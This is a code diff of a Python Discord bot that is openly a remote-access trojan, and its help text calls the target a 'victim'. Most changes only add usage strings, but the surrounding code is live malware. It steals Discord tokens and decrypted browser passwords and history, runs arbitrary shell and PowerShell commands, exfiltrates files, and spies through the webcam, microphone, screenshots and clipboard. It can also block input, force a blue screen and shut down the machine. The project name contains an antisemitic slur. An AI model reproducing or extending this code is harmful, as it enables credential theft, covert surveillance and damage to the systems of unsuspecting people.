@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.5.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.5.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -72,7 +72,7 @@ async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "
 commands.Context.fm_send = fm_send
 commands.Context.fm_reply = fm_reply
         
-@bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
+@bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)", usage="$update")
 async def update(ctx):
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("You don't have permission to access this command.", ephemeral=True)
@@ -94,7 +94,7 @@ async def update(ctx):
         creationflags = 0x00000008 | 0x08000000 # DETACHED_PROCESS | CREATE_NO_WINDOW
         subprocess.Popen([save_path, f"--prevpath={prevpath}"], creationflags=creationflags, close_fds=True)
 
-        await ctx.send(f"Updater `{attachment.filename}`has been downloaded and executed.")
+        await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
     except Exception as e:
         await ctx.send(f"Could not process the update. {e}")
         
@@ -119,11 +119,11 @@ async def prompt(ctx, *, question_and_default: str = ""):
 
     Thread(target=show_prompt, daemon=True).start()
 
-@bot.command(help="Checks if the victims device is up.")
+@bot.command(help="Checks if the victims device is up.", usage="$ping")
 async def ping(ctx):
     await ctx.send("Pong!")
 
-@bot.command(help="Shows victims device status including uptime, resource usage, etc.")
+@bot.command(help="Shows victims device status including uptime, resource usage, etc.", usage="$status")
 async def status(ctx):
     global version
     
@@ -178,7 +178,7 @@ def check_permissions(file_path):
     }
     return permissions
 
-@bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]")
+@bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]", usage="$wallpaper <set|get> [location]")
 async def wallpaper(ctx, action: str = None, filepath: str = None):
     try:
         if action is None or action.lower() not in ["get", "set"]:
@@ -232,7 +232,7 @@ async def wallpaper(ctx, action: str = None, filepath: str = None):
     except Exception as e:
         await ctx.send(f"Error processing wallpaper command: {str(e)}")
 
-@bot.command(help="Controls system volume. Usage: $vol [up/down/set/mute/unmute/query] [value]")
+@bot.command(help="Set or check system volume.", usage="$vol <up|down|set|mute|unmute|query> [value]")
 async def vol(ctx, action: str = "query", value: int = None):
     try:
         devices = AudioUtilities.GetSpeakers()
@@ -527,7 +527,7 @@ async def i_macro(execstr, ctx, echo_errors=True):
             ctx.send(f"Error running macro:")
             ctx.send(f"Exception: {e}")
 
-@bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md")
+@bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md", usage="$macro <script/file>")
 async def macro(ctx, *, command: str = None):
     if ctx.message.attachments:
         if len(ctx.message.attachments) > 1:
@@ -547,7 +547,7 @@ async def macro(ctx, *, command: str = None):
         
     await ctx.send("No .pymacro file attached!")
 
-@bot.command(help="Runs a command using subprocess and streams output live")
+@bot.command(help="Runs a command using subprocess and streams output live", usage="$cmd <command>")
 async def cmd(ctx, *, command: str = None):
     if not command or not command.strip():
         await ctx.send("Command cannot be empty.")
@@ -634,7 +634,7 @@ async def cmd(ctx, *, command: str = None):
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
-@bot.command(help="Runs a command in PowerShell and streams output live")
+@bot.command(help="Runs a command in PowerShell and streams output live", usage="$ps <command>")
 async def ps(ctx, *, command: str = None):
     if not command or not command.strip():
         await ctx.send("Command cannot be empty.")
@@ -750,7 +750,7 @@ async def ps(ctx, *, command: str = None):
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
-@bot.command(name="exec", help="Runs attached file and returns console output, format $exec [timeout (optional seconds)]")
+@bot.command(name="exec", help="Runs attached file and returns console output, format $exec [timeout (optional seconds)]", usage="$exec [timeout]")
 async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
     if not ctx.message.attachments or len(ctx.message.attachments) != 1:
         await ctx.send("Attach exactly one file.")
@@ -905,7 +905,7 @@ async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
     except Exception as e:
         print(f"Couldn't delete {os.path.basename(dest)}: {e}")
 
-@bot.command(name='checkperms', help="Checks if the program has access to provided file path")
+@bot.command(name='checkperms', help="Checks if the program has access to provided file path", usage="$checkperms <file/folder>")
 async def checkperms(ctx, file_path: str):
     permissions = check_permissions(file_path)
     perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
@@ -915,7 +915,7 @@ def compressed_device_id():
     uuid_raw = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
     return base64.b32encode(uuid.UUID(uuid_raw).bytes).decode().rstrip("=").lower()
 
-@bot.command(help="Delete and recreate bot's channel, wiping all messages, and channel permssions")
+@bot.command(help="Delete and recreate bot's channel, wiping all messages, and channel permssions", usage="$init [/f]")
 async def init(ctx):
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("You don't have permission to initialize this channel.")
@@ -1012,7 +1012,7 @@ async def on_message(message):
 
     await bot.process_commands(message)
     
-@bot.command(help="Gets information on the victim's system")
+@bot.command(help="Gets information on the victim's system", usage="$sysinfo")
 async def sysinfo(ctx):
     try:
         c = wmi.WMI()
@@ -1085,8 +1085,8 @@ def get_master_key(local_state_path):
     encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
     return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-@bot.command(help="Lists valid Start Menu shortcuts on the victim's system.")
-async def liststartapps(ctx):
+@bot.command(aliases=["liststartapps"], help="Lists valid Start Menu shortcuts on the victim's system.", usage="$startapps")
+async def startapps(ctx):
 
     start_menu_paths = [
         os.path.join(os.getenv("ProgramData"), r"Microsoft\Windows\Start Menu\Programs"),
@@ -1125,8 +1125,8 @@ async def liststartapps(ctx):
     outputunsf = "\n".join(sorted(appsunsf)) or "No valid shortcuts found."
     await ctx.fm_send(output, outputunsf, "startmenu.txt", )
 
-@bot.command(help="Lists installed Steam games with paths.")
-async def liststeamapps(ctx):
+@bot.command(aliases=["liststeamapps"], help="Lists installed Steam games with paths.", usage="$steamapps")
+async def steamapps(ctx):
     def get_steam_path():
         paths = []
         try:
@@ -1202,7 +1202,7 @@ async def liststeamapps(ctx):
     outputunsf = "\n".join(gamesunf) or "No steam games found."
     await ctx.fm_send(output, outputunsf, "output.txt")
 
-@bot.command(help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex")
+@bot.command(aliases=["get_discord"], help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex", usage="$getdiscord")
 async def getdiscord(ctx, max_force_profiles: int = 10):
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -1330,7 +1330,7 @@ def dump_passwords(login_data_path, key):
     conn.close()
     return entries
 
-@bot.command(help="Gets passwords from Google Chrome & Opera GX")
+@bot.command(aliases=["get_passwords"], help="Gets passwords from Google Chrome & Opera GX", usage="$getpasswords")
 async def getpasswords(ctx, max_force_profiles: int = 10):
     files = []
     missing_browsers = []
@@ -1451,7 +1451,7 @@ async def getpasswords(ctx, max_force_profiles: int = 10):
     except Exception as e:
         await ctx.send(f"Error sending message: {e}")
         
-@bot.command(help="Gets browser history from Google Chrome & Opera GX")
+@bot.command(aliases=["get_history"], help="Gets browser history from Google Chrome & Opera GX", usage="$gethistory")
 async def gethistory(ctx, max_force_profiles: int = 10):
     files = []
     missing_browsers = []
@@ -1607,8 +1607,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
     except Exception as e:
         await ctx.send(f"Error sending message: {e}")
 
-
-@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display, If you dont like it, you can suck it.")
+@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display.", usage="$setpos <x> <y>")
 async def setpos(ctx, x: int, y: int):
     try:
         pyautogui.moveTo(x, y)
@@ -1616,7 +1615,7 @@ async def setpos(ctx, x: int, y: int):
     except Exception as e:
         await ctx.send(f"Error setting cursor position: {str(e)}")
 
-@bot.command(help="Simulate left mouse click on victim's device.")
+@bot.command(help="Simulate left mouse click on victim's device.", usage="$lclick")
 async def lclick(ctx):
     try:
         pyautogui.click(button='left')
@@ -1624,7 +1623,7 @@ async def lclick(ctx):
     except Exception as e:
         await ctx.send(f"Error executing left click: {str(e)}")
 
-@bot.command(help="Simulate middle mouse click on victim's device.")
+@bot.command(help="Simulate middle mouse click on victim's device.", usage="$mclick")
 async def mclick(ctx):
     try:
         pyautogui.click(button='middle')
@@ -1632,7 +1631,7 @@ async def mclick(ctx):
     except Exception as e:
         await ctx.send(f"Error executing middle click: {str(e)}")
 
-@bot.command(help="Simulate right mouse click on victim's device.")
+@bot.command(help="Simulate right mouse click on victim's device.", usage="$rclick")
 async def rclick(ctx):
     try:
         pyautogui.click(button='right')
@@ -1640,7 +1639,7 @@ async def rclick(ctx):
     except Exception as e:
         await ctx.send(f"Error executing right click: {str(e)}")
 
-@bot.command(help="Triggers a pyautogui hotkey on victims device seperated by spaces. Available keys: https://bit.ly/3ya6vKg.")
+@bot.command(help="Triggers a pyautogui hotkey on victims device seperated by spaces. Available keys: https://bit.ly/3ya6vKg.", usage="$hotkey <keys (button+button)>")
 async def hotkey(ctx, *, keys=None):
     if not keys:
         await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
@@ -1652,7 +1651,7 @@ async def hotkey(ctx, *, keys=None):
     except Exception as e:
         await ctx.send(f"Error: `{e}`")
 
-@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
+@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg", usage="$key <up|down|press|hotkey (button+button)> <key(s)>")
 async def key(ctx, func: str = "", value: str = ""):
     if not func:
         await ctx.send("Function not provided. Available functions: press, down, up, hotkey.")
@@ -1684,22 +1683,22 @@ async def key(ctx, func: str = "", value: str = ""):
         await ctx.send(f"Error executing command: {str(e)}")
 
 
-@bot.command(help="Get victims clipboard.")
-async def get_clipboard(ctx):
+@bot.command(aliases=["get_clipboard"], help="Get victims clipboard.", usage="$get_clipboard")
+async def getclipboard(ctx):
     try:
         await ctx.send(f"Current clipboard: ```{pyperclip.paste()}```")
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
         
-@bot.command(help="Copy given text to victims clipboard.")
-async def set_clipboard(ctx, *, text: str):
+@bot.command(aliases=["set_clipboard"], help="Copy given text to victims clipboard.", usage="$set_clipboard <text>")
+async def setclipboard(ctx, *, text: str):
     try:
         pyperclip.copy(text)
         await ctx.send(f"Copied to clipboard")
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")   
 
-@bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).")
+@bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).", usage="$ss [displayNum|0 (default/all)]")
 async def ss(ctx, display_index: int = 0):
     try:
         with mss.mss() as sct:
@@ -1796,7 +1795,7 @@ def start_tts(text):
     if _tts_error: raise _tts_error
     return True
 
-@bot.command(name="tts", help="Run TTS on victim's system")
+@bot.command(name="tts", help="Run TTS on victim's system", usage="$tts <text>")
 async def tts(ctx, *, text: str = None):
     if not text or not text.strip():
         await ctx.send("You must provide text for TTS")
@@ -1807,7 +1806,7 @@ async def tts(ctx, *, text: str = None):
     except Exception as e:
         await ctx.send(f"Error: {e}")
 
-@bot.command(name="ttsurl", help="Run TTS on victim's system from a URL (should be raw text)")
+@bot.command(name="ttsurl", help="Run TTS on victim's system from a URL (should be raw text)", usage="$ttsurl <url>")
 async def ttsurl(ctx, url: str = None):
     if not url or not url.strip():
         await ctx.send("You must provide a url for TTS.")
@@ -1824,7 +1823,7 @@ async def ttsurl(ctx, url: str = None):
     except Exception as e:
         await ctx.send(f"Error: {e}")
 
-@bot.command(name="stoptts", help="Stops TTS")
+@bot.command(name="stoptts", help="Stops TTS", usage="$stoptts")
 async def stoptts(ctx):
     global _tts_thread, _tts_stop
     if _tts_thread and _tts_thread.is_alive():
@@ -1835,7 +1834,7 @@ async def stoptts(ctx):
 
 record_guard = Event()
 
-@bot.command(help="Records default audio device and default communications mic. format $listen {capture mode in|out|both (default both)} {duration in seconds default 10.0}")
+@bot.command(help="Records default audio device and default communications mic.", usage="$listen [in|out|both (default)]")
 async def listen(ctx, mode: str = "both", duration: float = 10):
     if record_guard.is_set():
         await ctx.send("A recording is already in progress.")
@@ -1966,7 +1965,7 @@ async def listen(ctx, mode: str = "both", duration: float = 10):
 
     Thread(target=record, args=(MODE,), daemon=True).start()
 
-@bot.command(help="Types the given text on the victim's system.")
+@bot.command(help="Types the given text on the victim's system.", usage="$write <text>")
 async def write(ctx, *, text: str):
     try:
         pyautogui.write(text)
@@ -1974,7 +1973,7 @@ async def write(ctx, *, text: str):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
         
-@bot.command(help="Upload a file to a specific path on victim's system")
+@bot.command(help="Upload a file to a specific path on victim's system", usage="$upload <destionation>")
 async def upload(ctx, folder: str = None):
     if not folder:
         await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
@@ -1989,7 +1988,7 @@ async def upload(ctx, folder: str = None):
     else:
         await ctx.send("Error: No file attached to the message.")
 
-@bot.command(help="Lists contents of a folder on the system, format $ls {folder (D:/folder)}")
+@bot.command(help="Lists contents of a folder on the system", usage="$ls <folder>")
 async def ls(ctx, path: str = None):
     try:
         if not path:
@@ -2055,7 +2054,7 @@ async def downloadandrun(ctx):
         if os.path.exists(file_path):
             os.remove(file_path)
 
-@bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
+@bot.command(help="Runs a specified program on victim's system", usage="$run <file>")
 async def run(ctx, file_path: str = None):
     if not file_path:
         await ctx.send("Error: No file path provided. Please specify the file path to run.")
@@ -2069,7 +2068,7 @@ async def run(ctx, file_path: str = None):
     except Exception as e:
         await ctx.send(f"Error: Could not execute the file. {str(e)}")    
 
-@bot.command(help="Compresses and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
+@bot.command(help="Compresses and downloads a file or folder from victim's system", usage="$download <file/folder>")
 async def download(ctx, file_path: str = None):
     try:
         if not file_path:
@@ -2088,7 +2087,7 @@ async def download(ctx, file_path: str = None):
     except Exception as e:
         await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
     
-@bot.command(help="Deletes a folder or file from the victim's system, format $delete {file (D:/file.png)}")
+@bot.command(help="Deletes a folder or file from the victim's system", usage="$delete <file>")
 async def delete(ctx, path: str = None):
     if not path:
         await ctx.send("Error: No path provided. Please specify a file or folder path to delete.")
@@ -2102,7 +2101,7 @@ async def delete(ctx, path: str = None):
     else:
         await ctx.send(f"The path '{path}' does not exist.")
         
-@bot.command(help="Moves a file from one location to another on victim's system, format $move {file (D:/file.png)} {folder (D:/destination/)}")
+@bot.command(help="Moves a file from one location to another on victim's system", usage="$move <file> <destination>")
 async def move(ctx, source: str = None, destination: str = None):
     if not source or not destination:
         await ctx.send("Error: Please provide both source and destination paths.")
@@ -2120,7 +2119,7 @@ async def move(ctx, source: str = None, destination: str = None):
     except Exception as e:
         await ctx.send(f"Error: Could not move '{source}' to '{destination}'. {str(e)}")
 
-@bot.command(help="Freezes the cursor on the victim's system.")
+@bot.command(help="Freezes the cursor on the victim's system.", usage="$freezecursor")
 async def freezecursor(ctx):
     try:
         result = ctypes.windll.user32.BlockInput(True)
@@ -2131,7 +2130,7 @@ async def freezecursor(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Unfreezes the cursor on the victim's system.")
+@bot.command(help="Unfreezes the cursor on the victim's system.", usage="$unfreezecursor")
 async def unfreezecursor(ctx):
     try:
         ctypes.windll.user32.BlockInput(False)
@@ -2139,7 +2138,7 @@ async def unfreezecursor(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Attempts to trigger a blue screen on the victim's system.")
+@bot.command(help="Attempts to trigger a blue screen on the victim's system.", usage="$bluescreen")
 async def bluescreen(ctx):
     try:
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -2148,7 +2147,7 @@ async def bluescreen(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Takes a picture on the victim's webcam.")
+@bot.command(help="Takes a picture on the victim's webcam.", usage="$webcampic [cameraID]")
 async def webcampic(ctx, cam: int = 0):
     try:
         cap = cv2.VideoCapture(cam)
@@ -2170,7 +2169,7 @@ async def webcampic(ctx, cam: int = 0):
     except Exception as e:
         await ctx.send(f"Error executing webcam capture command: {str(e)}")
 
-@bot.command(help="Lists all running tasks on the victim's system.")
+@bot.command(help="Lists all running tasks on the victim's system.", usage="$tasks")
 async def tasks(ctx):
     import psutil, io, discord
     try:
@@ -2185,7 +2184,7 @@ async def tasks(ctx):
     except Exception as e:
         await ctx.send(f"Error: Could not list tasks. {str(e)}")
 
-@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
+@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.", usage="$kill <taskname>")
 async def kill(ctx, arg: str = ""):
     if arg == "" or not arg:
         await ctx.send("Please enter a task to be terminated")
@@ -2210,7 +2209,7 @@ async def kill(ctx, arg: str = ""):
     except Exception as e:
         await ctx.send(f"Error terminating task: {str(e)}")
 
-@bot.command(help="Opens the given website on the victim's default browser and maximizes it.")
+@bot.command(help="Opens the given website on the victim's default browser and maximizes it.", usage="$website <url>")
 async def website(ctx, *, url: str):
     try:
         webbrowser.open(url)
@@ -2221,7 +2220,7 @@ async def website(ctx, *, url: str):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Shuts down the victim's system.")
+@bot.command(help="Shuts down the victim's system.", usage="$shutdown")
 async def shutdown(ctx):
     try:
         os.system('shutdown /s /t 1')
@@ -2229,7 +2228,7 @@ async def shutdown(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Restarts the victim's system.")
+@bot.command(help="Restarts the victim's system.", usage="$restart")
 async def restart(ctx):
     try:
         os.system('shutdown /r /t 1')
@@ -2237,7 +2236,7 @@ async def restart(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Logs off the current user on the victim's system.")
+@bot.command(help="Logs off the current user on the victim's system.", usage="$logoff")
 async def logoff(ctx):
     try:
         os.system('shutdown /l')
@@ -2245,7 +2244,7 @@ async def logoff(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command()
+@bot.command(help="Gets description of a specific command", usage="$help <command>")
 async def help(ctx, command_name: str):
     command = bot.get_command(command_name)
     if command:
@@ -2260,7 +2259,7 @@ async def help(ctx, command_name: str):
 
 per_page = 10
 
-@bot.command()
+@bot.command(help="List bot commands in alphabetical order", usage="$commands")
 async def commands(ctx, page: int = 1):
     commands_list = list(bot.commands)
     commands_list.sort(key=lambda cmd: cmd.name)
@@ -2328,7 +2327,7 @@ async def commands(ctx, page: int = 1):
         except asyncio.TimeoutError:
             break
         
-@bot.command(help="Force stops the bot.")
+@bot.command(help="Force stops the bot.", usage="$estop")
 async def estop(ctx):
     await ctx.send("Force stopping bot...")
     await bot.close()
